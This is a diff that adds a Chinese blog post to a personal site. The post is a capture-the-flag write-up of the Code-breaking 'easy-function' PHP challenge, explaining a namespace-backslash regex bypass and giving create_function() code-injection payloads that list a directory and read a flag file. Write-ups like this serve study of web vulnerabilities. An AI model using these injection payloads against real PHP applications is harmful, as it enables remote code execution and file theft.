@@ -242,6 +242,144 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://dopaminer.github.io/2019/09/14/Code-breaking write-up（持续更新）/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="D0pamine">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/头像.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dopamine's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/09/14/Code-breaking write-up（持续更新）/" itemprop="url">未命名</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-14T15:47:52+08:00">
+                2019-09-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Code-breaking-write-up"><a href="#Code-breaking-write-up" class="headerlink" title="Code-breaking write-up"></a>Code-breaking write-up</h1><p>最近做了code-breaking的题，对我这种菜鸡来说还是挺难的，学到很多，记录一下。这是第一篇博客，希望以后努力产出吧，慢慢变强。</p>
+<h2 id="0x01-easy-function"><a href="#0x01-easy-function" class="headerlink" title="0x01 easy-function"></a>0x01 easy-function</h2><p>知识点：</p>
+<ol>
+<li>php默认命名空间</li>
+<li>create_function()函数特性</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action(<span class="string">''</span>, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解读一下，前两行那个<code>??</code>是php7的新特性，就相当于条件表达式</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$action=isset($_GET[<span class="string">'action'</span>])?$_GET[<span class="string">'action'</span>]:<span class="string">''</span>;</span><br></pre></td></tr></table></figure>
+
+<p>反正…大概在做的事情就是限制输入的变量action不能为空吧。</p>
+<p>后面的正则，就是要求action的开头或者结尾有特殊字符又对函数名不造成影响，这里有个知识点，就是php的默认命名空间，引用p牛的话就是，php里默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。<br>所以这里刚好可以用<code>\</code>绕过正则。</p>
+<p>其实整道题我们的目的就是最终实现RCE，所以后面构造的函数尤为关键，目前我能想到的符合所给的格式，也就是第一个参数是参数，第二个参数是可执行的内容的，也就是<code>create_function()</code>了。关于这个函数如何实现代码注入可以看这篇<a href="https://blog.51cto.com/lovexm/1743442" target="_blank" rel="noopener">文章</a>。<img src="https://img-blog.csdnimg.cn/20190914151056213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzQ4MDI2MA==,size_16,color_FFFFFF,t_70" alt="对create_function的介绍"></p>
+<p>参照文章所给的payload，尝试一下,成了<img src="https://img-blog.csdnimg.cn/20190914151350966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzQ4MDI2MA==,size_16,color_FFFFFF,t_70" alt>后面就简单了，也没啥过滤，直接构造payload读flag就行了。<br>附上payload：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=\create_function&amp;arg=<span class="number">2</span>;&#125;print_r(scandir(<span class="string">'../'</span>));<span class="comment">/*</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=\create_function&amp;arg=<span class="number">2</span>;&#125;print_r(file_get_contents(<span class="string">'../flag_h0w2execute_arb1trary_c0de'</span>));<span class="comment">/*</span></span><br></pre></td></tr></table></figure>
+
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://dopaminer.github.io/2019/08/18/test/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -397,7 +535,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-count">2</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
